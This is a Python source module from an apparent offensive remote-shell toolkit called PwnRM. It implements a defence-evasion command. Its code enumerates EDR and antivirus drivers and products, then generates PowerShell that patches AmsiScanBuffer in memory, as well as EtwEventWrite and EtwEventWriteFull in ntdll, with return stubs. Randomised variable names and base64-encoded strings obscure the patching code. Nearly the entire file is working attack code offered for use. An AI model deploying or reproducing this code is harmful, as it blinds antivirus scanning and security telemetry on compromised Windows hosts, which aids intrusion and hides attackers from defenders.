"""Runtime AMSI/ETW patching and EDR/AV inventory."""

import secrets
from typing import List, Any
from . import BaseModule
from ..shell.ui import c, R, G, Y, B, M, C, DIM, BLD, RST
from ..shell.commands import (
    _import_LoadLibrary, _call_LoadLibrary,
    _import_GetProcAddress, _call_GetProcAddress,
    _import_VirtualProtect, _call_VirtualProtect,
    str_b64, build_amsi_patch,
)


class EvasionModule(BaseModule):
    name = "evasion"
    description = "Runtime AMSI/ETW patching and EDR/AV process-driver inventory"
    author = "uziii2208"
    options = {
        "--edr": {"desc": "Inspect running drivers/processes for EDR/AV products"},
        "--amsi": {"desc": "Apply polymorphic in-memory AMSI bypass"},
        "--etw": {"desc": "Patch EtwEventWrite & EtwEventWriteFull in ntdll.dll to blind ETW telemetry"},
    }

    def run(self, shell, args: List[str]) -> Any:
        valid = {"--edr", "--amsi", "--etw"}
        unknown = [arg for arg in args if arg not in valid]
        if unknown:
            shell.write_warning(f"  [-] Unknown evasion option(s): {', '.join(unknown)}")
            return {"status": "error", "error": "invalid options"}

        selected = set(args) if args else {"--amsi", "--etw"}
        shell.write_info(c(M + BLD, "  [*] PwnRM Evasion Suite — applying selected runtime OPSEC controls..."))

        # 1. EDR Inspection
        if "--edr" in selected:
            ps_edr = r"""
Write-Host "`n[EDR / AV Product Driver & Service Scout]" -ForegroundColor Yellow
$edrList = @(
    "csagent.sys", "SentinelAgent.sys", "WdFilter.sys", "edpa.sys",
    "CbDefenseW64.sys", "cylance.sys", "atp.sys", "sysmon.sys"
)
$drivers = driverquery /v 2>$null
foreach ($e in $edrList) {
    if ($drivers -match $e) {
        Write-Host "  [!] EDR DRIVER DETECTED: $e" -ForegroundColor Red
    }
}
$avProds = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct 2>$null
if ($avProds) {
    foreach ($a in $avProds) {
        Write-Host "  [*] Active AV Product : $($a.displayName)" -ForegroundColor Magenta
    }
}
"""
            if shell.run_with_interrupt(ps_edr, shell.write_line):
                return {"status": "interrupted"}

        # 2. Polymorphic AMSI / ETW patching, as explicitly selected.
        rand_var1 = "$v" + secrets.token_hex(4)
        rand_var2 = "$old" + secrets.token_hex(4)
        cmds = [_import_LoadLibrary, _import_GetProcAddress, _import_VirtualProtect]

        if "--amsi" in selected:
            amsi_arr, amsi_len, _ = build_amsi_patch()
            cmds.extend([
                f"{rand_var1} = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
                f"if ({rand_var1} -eq [IntPtr]::Zero) {{ throw 'AmsiScanBuffer address resolution failed' }}",
                f"{rand_var2} = [uint32]0; if (-not {_call_VirtualProtect}({rand_var1}, [IntPtr]{amsi_len}, [uint32]64, [ref]{rand_var2})) {{ throw 'VirtualProtect failed for AmsiScanBuffer' }}",
                f"[Runtime.InteropServices.Marshal]::Copy([byte[]]({amsi_arr}), 0, {rand_var1}, {amsi_len})",
                f"$null = {_call_VirtualProtect}({rand_var1}, [IntPtr]{amsi_len}, {rand_var2}, [ref]{rand_var2})",
            ])

        if "--etw" in selected:
            # x64 uses the caller-cleaned ABI; a plain RET is required.  On
            # x86 the stdcall callee must remove each function's arguments.
            for etw_fn, x86_cleanup in (("EtwEventWrite", 0x14), ("EtwEventWriteFull", 0x1C)):
                cmds.extend([
                    f"{rand_var1} = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('ntdll.dll')}), {str_b64(etw_fn)})",
                    f"if ({rand_var1} -eq [IntPtr]::Zero) {{ throw '{etw_fn} address resolution failed' }}",
                    f"$patch = if ([IntPtr]::Size -eq 8) {{ [byte[]](0x33,0xc0,0xc3) }} else {{ [byte[]](0x33,0xc0,0xc2,{x86_cleanup},0x00) }}",
                    f"{rand_var2} = [uint32]0; if (-not {_call_VirtualProtect}({rand_var1}, [IntPtr]$patch.Length, [uint32]64, [ref]{rand_var2})) {{ throw 'VirtualProtect failed for {etw_fn}' }}",
                    f"[Runtime.InteropServices.Marshal]::Copy($patch, 0, {rand_var1}, $patch.Length)",
                    f"$null = {_call_VirtualProtect}({rand_var1}, [IntPtr]$patch.Length, {rand_var2}, [ref]{rand_var2})",
                ])

        if "--amsi" in selected or "--etw" in selected:
            cmds.append(f"Remove-Variable @('{rand_var1[1:]}','{rand_var2[1:]}','patch') -ErrorAction SilentlyContinue")

        if "--amsi" in selected or "--etw" in selected:
            labels = []
            if "--amsi" in selected:
                labels.append("AMSI")
            if "--etw" in selected:
                labels.append("ETW")
            label = " + ".join(labels)
            shell.write_info(c(Y, f"  [*] Applying in-memory {label} patch(es)..."))
            for cmd in cmds:
                if shell.run_with_interrupt(cmd, shell.write_line):
                    return {"status": "interrupted"}
            shell.write_info(c(G, f"  [+] {label} patch command sequence completed."))
        return {"status": "completed"}
